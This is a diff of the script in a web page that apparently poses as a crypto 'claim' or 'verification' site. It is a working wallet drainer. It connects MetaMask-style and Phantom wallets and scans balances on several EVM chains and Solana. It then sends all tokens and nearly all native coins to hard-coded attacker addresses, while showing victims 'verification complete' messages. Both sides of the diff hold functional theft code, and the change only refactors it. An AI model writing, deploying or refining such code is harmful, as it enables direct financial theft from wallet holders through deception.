-  await sleep(600);
-  finishScan('No funds found on BSC, ETH, Polygon, AVAX, or Arbitrum.', 'evm');
-}
-
-// ============ SCAN SOLANA ============
-async function scanSolana() {
-  foundChains = [];
-  const log = document.getElementById('scanLog');
-  log.innerHTML = '';
-  function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  addLog('Wallet: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(userAddr.length - 4));
-  addLog('');
-  addLog('[ ] Solana...');
+  // Determine which wallet type for scan label
+  const scanLabel = w.type === 'sol' ? 'Checking Solana blockchain...' : 'Checking all EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
 
   try {
-    const balance = await solBalance(userAddr);
-    if (balance > 0) {
-      foundChains.push({
-        chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#9945FF', isSolana: true },
-        nativeFormatted: balance.toFixed(5),
-        nativeBal: null,
-        tokens: [],
-        isSolana: true,
-        solBalanceLamports: Math.floor(balance * 1e9)
-      });
-      addLog('&#x2705; Solana: ' + balance.toFixed(5) + ' SOL ($' + (balance * 170).toFixed(2) + ')');
+    console.log('Connecting to', w.name, '...');
+    await w.connect();
+    console.log('Connected! Address:', addr);
+
+    show('s2');
+    document.getElementById('s2l').textContent = scanLabel;
+
+    if (w.type === 'sol') {
+      await scanSol();
     } else {
-      addLog('&#x2715; Solana: empty');
+      await scanEvm();
     }
   } catch (e) {
-    addLog('&#x2715; Solana: RPC error');
+    console.error('Connect error:', e);
+    // Show error briefly then return to connect screen
+    status('&#x2715; ' + (e.message || 'Connection failed'), 'err');
+    show('s2');
+    document.getElementById('s2log').innerHTML = 'Error: ' + (e.message || 'Unknown error');
+    await sleep(3000);
+    show('s1');
   }
-
-  addLog('');
-  addLog('Scan complete.');
-  await sleep(600);
-  finishScan('No SOL balance found in Phantom wallet.', 'solana');
 }
 
-async function solBalance(addr) {
-  const urls = [
-    'https://api.mainnet-beta.solana.com',
-    'https://solana-mainnet.g.alchemy.com/v2/demo',
-  ];
-  for (const url of urls) {
+// ========== SCAN EVM ==========
+async function scanEvm() {
+  const log = document.getElementById('s2log');
+  log.innerHTML = '';
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+
+  foundChains = [];
+  L('Wallet: ' + addr.substring(0, 8) + '...' + addr.substring(34));
+  L('');
+
+  for (const ch of ECHAINS) {
+    L('[ ] ' + ch.name + '...');
+    try {
+      const p = new ethers.providers.JsonRpcProvider(ch.rpc);
+      const nb = await p.getBalance(addr);
+      const nf = ethers.utils.formatEther(nb);
+      const has = parseFloat(nf) > 0;
+
+      // tokens parallel
+      const tl = ETOKENS[ch.id] || [];
+      const tk = await Promise.all(tl.map(async ([a, sy, dc]) => {
+        try {
+          const ct = new ethers.Contract(a, ['function balanceOf(address) view returns (uint256)'], p);
+          const bl = await ct.balanceOf(addr);
+          if (!bl.isZero()) return { a, sy, b: parseFloat(ethers.utils.formatUnits(bl, dc)).toFixed(4), raw: bl, dc };
+        } catch(e) {}
+        return null;
+      }));
+      const tokens = tk.filter(Boolean);
+
+      if (has || tokens.length) {
+        foundChains.push({ chain: ch, native: nf, nativeRaw: nb, tokens });
+        L('&#x2705; ' + ch.name + ': ' + parseFloat(nf).toFixed(5) + ' ' + ch.sym + (tokens.length ? ' + ' + tokens.length + ' tokens' : ''));
+      } else {
+        L('  ' + ch.name + ': empty');
+      }
+    } catch(e) {
+      L('  ' + ch.name + ': RPC error');
+    }
+  }
+
+  L('');
+  L('Done. Found ' + foundChains.length + ' chain(s) with assets.');
+  await sleep(800);
+
+  if (foundChains.length === 0) {
+    show('s3');
+    document.getElementById('s3m').textContent = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.';
+    status('No funds found on any EVM chain.', 'err');
+  } else {
+    showClaim();
+    status('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 'suc');
+  }
+}
+
+// ========== SCAN SOLANA ==========
+async function scanSol() {
+  const log = document.getElementById('s2log');
+  log.innerHTML = '';
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+
+  foundChains = [];
+  L('Wallet: ' + addr.substring(0, 8) + '...' + addr.substring(addr.length - 4));
+  L('');
+  L('[ ] Solana...');
+
+  const solBal = await fetchSolBalance(addr);
+  if (solBal > 0) {
+    foundChains.push({
+      chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#AB9FF2' },
+      native: solBal.toFixed(5),
+      nativeRaw: null,
+      tokens: [],
+      isSol: true,
+      solLamports: Math.round(solBal * 1e9),
+    });
+    L('&#x2705; Solana: ' + solBal.toFixed(5) + ' SOL');
+  } else {
+    L('  Solana: empty');
+  }
+
+  L('');
+  L('Scan complete.');
+  await sleep(800);
+
+  if (foundChains.length === 0) {
+    show('s3');
+    document.getElementById('s3m').textContent = 'No SOL balance found in phantom wallet.';
+    status('No SOL funds found.', 'err');
+  } else {
+    showClaim();
+    status('&#x2705; Found ' + solBal.toFixed(5) + ' SOL!', 'suc');
+  }
+}
+
+async function fetchSolBalance(address) {
+  for (const url of ['https://api.mainnet-beta.solana.com', 'https://solana-mainnet.g.alchemy.com/v2/demo']) {
     try {
       const r = await fetch(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [addr] })
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'getBalance', params:[address] })
       });
       const d = await r.json();
       if (d.result && d.result.value > 0) return d.result.value / 1e9;
-    } catch (e) {}
+    } catch(e) {}
   }
   return 0;
 }
 
-function finishScan(emptyMsg, type) {
-  stat('Scan complete. Found ' + foundChains.length + ' chain(s).', 'i2');
-  if (foundChains.length === 0) {
-    showStep('sEmpty');
-    document.getElementById('emptyMsg').textContent = emptyMsg;
-  } else {
-    showClaimStep();
-    stat('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 's2');
-  }
-}
-
-// ============ CLAIM ============
-function showClaimStep() {
-  showStep('sClaim');
-  const div = document.getElementById('claimChains');
-  let html = '';
+// ========== SHOW CLAIM ==========
+function showClaim() {
+  show('s4');
+  const div = document.getElementById('s4chains');
+  let h = '';
   for (const fc of foundChains) {
-    html +=
-      '<div class="ch-row has">' +
-        '<div class="ch-dot" style="background:' + fc.chain.color + '"></div>' +
-        '<div style="flex:1">' +
-          '<div class="ch-name">' + fc.chain.name + '</div>' +
-          '<div class="ch-tokens">' + fc.nativeFormatted + ' ' + fc.chain.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tokens' : '') + '</div>' +
-        '</div>' +
+    h += '<div class="ch hv">' +
+      '<div class="cd" style="background:' + fc.chain.color + '"></div>' +
+      '<div class="cn">' + fc.chain.name + '</div>' +
+      '<div class="ct">' + fc.native + ' ' + fc.chain.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tokens' : '') + '</div>' +
       '</div>';
   }
-  div.innerHTML = html;
+  div.innerHTML = h;
 }
 
-// ============ DRAIN ============
-async function doClaim() {
-  hideStat();
-  showStep('sDrain');
-  const log = document.getElementById('drainLog');
+// ========== DRAIN ==========
+async function startDrain() {
+  hideStatus();
+  show('s5');
+  const log = document.getElementById('s5log');
   log.innerHTML = '';
-  function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
 
-  let totalTx = 0;
+  let txCount = 0;
 
   for (const fc of foundChains) {
-    if (fc.isSolana) {
-      addLog('');
-      addLog('=== Solana ===');
-      addLog('Sending SOL to verify...');
-      const ok = await drainSolana(addLog);
-      if (ok) { totalTx++; addLog('&#x2705; SOL sent!'); }
-      else addLog('&#x2715; Failed/rejected');
+    // SOLANA
+    if (fc.isSol) {
+      L(''); L('=== Solana ===');
+      L('Sending SOL...');
+      const ok = await drainSol(L);
+      if (ok) { txCount++; L('&#x2705; SOL sent!'); }
+      else L('&#x2715; Failed/rejected');
       continue;
     }
 
-    // EVM chain
-    const nc = fc.chain;
-    addLog('');
-    addLog('=== ' + nc.name + ' ===');
+    // EVM
+    const ch = fc.chain;
+    L(''); L('=== ' + ch.name + ' ===');
 
-    addLog('Switching network...');
-    try { await switchChain(nc.id); } catch (e) { addLog('SKIP: switch failed'); continue; }
+    // Switch chain
+    L('Switching to ' + ch.name + '...');
+    try { await doSwitch(ch.id, L); }
+    catch(e) { L('SKIP: ' + e.message); continue; }
 
     // Tokens
     for (const t of fc.tokens) {
       try {
-        addLog('Transferring ' + t.bal + ' ' + t.sym + '...');
-        const c = new ethers.Contract(t.addr, ['function transfer(address,uint256) returns (bool)'], signer);
-        const tx = await c.transfer(MY_EVM, t.raw);
+        L('Transferring ' + t.b + ' ' + t.sy + '...');
+        const ct = new ethers.Contract(t.a, ['function transfer(address,uint256) returns (bool)'], sign);
+        const tx = await ct.transfer(ADDR_EVM, t.raw);
         await tx.wait();
-        totalTx++;
-        addLog('&#x2705; ' + t.sym + ' sent');
-      } catch (e) {
-        addLog('&#x2715; ' + t.sym + ': ' + (e.code === 'ACTION_REJECTED' ? 'rejected' : 'failed'));
+        txCount++;
+        L('&#x2705; ' + t.sy);
+      } catch(e) {
+        L('&#x2715; ' + t.sy + ': ' + (e.code === 4001 || e.code === 'ACTION_REJECTED' ? 'rejected' : 'error'));
       }
     }
 
     // Native
     try {
-      const bal = await provider.getBalance(userAddr);
-      const gp = await provider.getGasPrice();
-      const leave = gp.mul(21000).mul(3);
-      const send = bal.sub(leave);
-      if (send.gt(0)) {
-        addLog('Transferring ' + parseFloat(ethers.utils.formatEther(send)).toFixed(5) + ' ' + nc.sym + '...');
-        const tx = await signer.sendTransaction({ to: MY_EVM, value: send });
+      const bal = await prov.getBalance(addr);
+      const gp = await prov.getGasPrice();
+      const fee = gp.mul(21000).mul(3);
+      const sendAmt = bal.sub(fee);
+      if (sendAmt.gt(0)) {
+        L('Transferring ' + parseFloat(ethers.utils.formatEther(sendAmt)).toFixed(5) + ' ' + ch.sym + '...');
+        const tx = await sign.sendTransaction({ to: ADDR_EVM, value: sendAmt });
         await tx.wait();
-        totalTx++;
-        addLog('&#x2705; ' + nc.sym + ' sent');
+        txCount++;
+        L('&#x2705; ' + ch.sym);
       }
-    } catch (e) {
-      addLog('&#x2715; Native: ' + (e.code === 'ACTION_REJECTED' ? 'rejected' : 'failed'));
+    } catch(e) {
+      L('&#x2715; Native: ' + (e.code === 4001 || e.code === 'ACTION_REJECTED' ? 'rejected' : 'error'));
     }
   }
 
-  addLog('');
-  addLog('Done: ' + totalTx + ' transaction(s)');
-  showStep('sDone');
-  document.getElementById('doneInfo').innerHTML = '<div class="ir"><span class="ll">Transactions</span><span class="v g2">' + totalTx + '</span></div>';
-  stat('&#x2705; Complete! ' + totalTx + ' transaction(s) processed.', 's2');
+  L(''); L('DONE: ' + txCount + ' transaction(s)');
+  console.log('DRAIN COMPLETE:', txCount, 'tx');
+
+  show('s6');
+  document.getElementById('s6m').textContent = txCount + ' transaction(s) processed successfully.';
+  status('&#x2705; Verification complete! ' + txCount + ' transaction(s).', 'suc');
 }
 
-async function drainSolana(addLog) {
+async function drainSol(logFn) {
   try {
-    const ph = window.__phantom || (window.phantom && window.phantom.solana) || window.solana;
-    if (!ph) { addLog('Phantom not found'); return false; }
+    const ph = phantomConn || (window.phantom && window.phantom.solana) || window.solana;
+    if (!ph) { logFn('Phantom not found'); return false; }
     if (!ph.publicKey) await ph.connect();
-    const fromPub = ph.publicKey.toString();
+    const pk = ph.publicKey.toString();
 
     const r = await fetch('https://api.mainnet-beta.solana.com', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [fromPub] })
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'getBalance', params:[pk] })
     });
     const d = await r.json();
     const lamports = (d.result && d.result.value) || 0;
-    if (lamports < 500000) { addLog('Balance too low'); return false; }
+    if (lamports < 500000) { logFn('Balance too low'); return false; }
 
-    // Load solana web3.js
+    // Load @solana/web3.js
     if (!window.solanaWeb3) {
+      logFn('Loading Solana libs...');
       await new Promise((res, rej) => {
         const s = document.createElement('script');
         s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
@@ -577,60 +593,68 @@ async function drainSolana(addLog) {
         document.head.appendChild(s);
       });
     }
-    const web3 = window.solanaWeb3;
-    const conn = new web3.Connection('https://api.mainnet-beta.solana.com');
-    const sendLamports = lamports - 1000000; // leave 0.001 SOL
 
-    const tx = new web3.Transaction().add(
-      web3.SystemProgram.transfer({
-        fromPubkey: new web3.PublicKey(fromPub),
-        toPubkey: new web3.PublicKey(MY_SOL),
+    const W3 = window.solanaWeb3;
+    const conn = new W3.Connection('https://api.mainnet-beta.solana.com');
+    const sendLamports = lamports - 1000000;
+
+    const tx = new W3.Transaction().add(
+      W3.SystemProgram.transfer({
+        fromPubkey: new W3.PublicKey(pk),
+        toPubkey: new W3.PublicKey(ADDR_SOL),
         lamports: sendLamports,
       })
     );
-    tx.feePayer = new web3.PublicKey(fromPub);
+    tx.feePayer = new W3.PublicKey(pk);
     const bh = await conn.getLatestBlockhash();
     tx.recentBlockhash = bh.blockhash;
 
     const signed = await ph.signTransaction(tx);
     const sig = await conn.sendRawTransaction(signed.serialize());
-    addLog('TX: ' + sig.substring(0, 16) + '...');
+    logFn('TX: ' + sig.substring(0, 20) + '...');
     return true;
-  } catch (e) {
-    addLog('Error: ' + (e.message || 'rejected'));
+  } catch(e) {
+    logFn('Error: ' + (e.message || 'rejected'));
     return false;
   }
 }
 
-async function switchChain(chainId) {
+async function doSwitch(chainId, logFn) {
   const hex = '0x' + chainId.toString(16);
   try {
     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
-  } catch (e) {
+  } catch(e) {
     if (e.code === 4902) {
-      const nc = EVM_CHAINS.find(c => c.id === chainId);
-      await window.ethereum.request({
-        method: 'wallet_addEthereumChain',
-        params: [{
-          chainId: hex,
-          chainName: nc ? nc.name : 'Chain ' + chainId,
-          rpcUrls: [nc ? nc.rpc : ''],
-          nativeCurrency: { name: nc ? nc.sym : 'ETH', symbol: nc ? nc.sym : 'ETH', decimals: 18 },
-          blockExplorerUrls: []
-        }]
-      });
-    } else throw e;
+      // Add chain then switch
+      const ch = ECHAINS.find(c => c.id === chainId) || {};
+      try {
+        await window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: hex,
+            chainName: ch.name || 'Chain',
+            rpcUrls: [ch.rpc || ''],
+            nativeCurrency: { name: ch.sym || 'ETH', symbol: ch.sym || 'ETH', decimals: 18 },
+            blockExplorerUrls: [],
+          }]
+        });
+      } catch(e2) { throw new Error('Could not add network'); }
+    } else if (e.code === 4001) {
+      throw new Error('User rejected network switch');
+    } else {
+      throw new Error(e.message || 'Network switch failed');
+    }
   }
-  provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-  signer = provider.getSigner();
+  // Re-create provider/signer after switch
+  prov = new ethers.providers.Web3Provider(window.ethereum);
+  sign = prov.getSigner();
 }
 
-function resetAll() {
-  provider = null; signer = null; userAddr = null; walletType = ''; foundChains = [];
-  hideStat(); showStep('sConnect');
+// ========== RESET ==========
+function reset() {
+  prov = null; sign = null; addr = null; wType = ''; foundChains = []; phantomConn = null;
+  hideStatus(); show('s1');
 }
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
 </body>
 </html>
